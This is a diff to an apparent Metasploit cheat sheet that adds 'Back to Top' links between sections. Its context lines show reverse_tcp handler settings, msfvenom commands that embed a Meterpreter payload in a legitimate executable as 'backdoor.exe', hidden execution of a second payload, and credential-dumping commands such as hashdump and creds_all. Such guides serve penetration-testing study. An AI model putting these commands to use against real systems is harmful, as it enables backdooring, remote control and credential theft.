@@ -273,7 +273,7 @@ set LHOST 192.168.1.5
 set LPORT 4444
 run
 
-
+[🔝 Back to Top](#top)
 
 # 3. Exploits
 
@@ -548,7 +548,7 @@ run
 |9. Run exploit     |      → run|
 |10. Interact with session| → sessions -i [ID]|
 
-
+[🔝 Back to Top](#top)
 
 # 4. Auxiliary Modules
 
@@ -859,7 +859,7 @@ run
 |6. Analyze output     |       → Look for interesting results|
 |7. Move to next module   |    → Use findings to select next scan|
 
-
+[🔝 Back to Top](#top)
 
 
 # 5. Post-Exploitation (Meterpreter)
@@ -1162,7 +1162,7 @@ screenshot
 - Background the session when done
 background
 
-
+[🔝 Back to Top](#top)
 
 # 6. Database Commands
 
@@ -1468,7 +1468,7 @@ workspace -a TargetCorp_COMPLETED
 |List vulnerabilities| vulns|
 |Generate report| report -f html -o [file]|
 
-
+[🔝 Back to Top](#top)
 
 # 7. Encoders and Evasion
 
@@ -1689,7 +1689,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x 
 |Embed in legitimate EXE	|msfvenom -p [payload] -x [legit.exe] -f exe -o backdoor.exe|
 |Avoid bad characters	|msfvenom -b '\x00\xff'|
 
-
+[🔝 Back to Top](#top)
 
 
 # 8. Handlers and Listeners
@@ -1955,7 +1955,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f 
 |Interact with session |sessions -i [id]|
 
 
-
+[🔝 Back to Top](#top)
 
 
 # 9. Resource Scripts
@@ -2272,7 +2272,7 @@ screenshot
 |Set variable |set VARNAME value|
 |Use variable| echo $VARNAME|
 
-
+[🔝 Back to Top](#top)
 
 
 # 10. Advanced Techniques
@@ -2617,7 +2617,7 @@ meterpreter > execute -f C:\\Windows\\Temp\\second_payload.exe -H
 |Migrate process|	migrate [PID]|
 
 
-
+[🔝 Back to Top](#top)
 
 # 11. Troubleshooting
 
@@ -2823,3 +2823,4 @@ nc -zv 192.168.1.5 4444
 |hashdump fails|	load kiwi; creds_all|
 |Connection drops	|Use reverse_https|
 
+[🔝 Back to Top](#top)
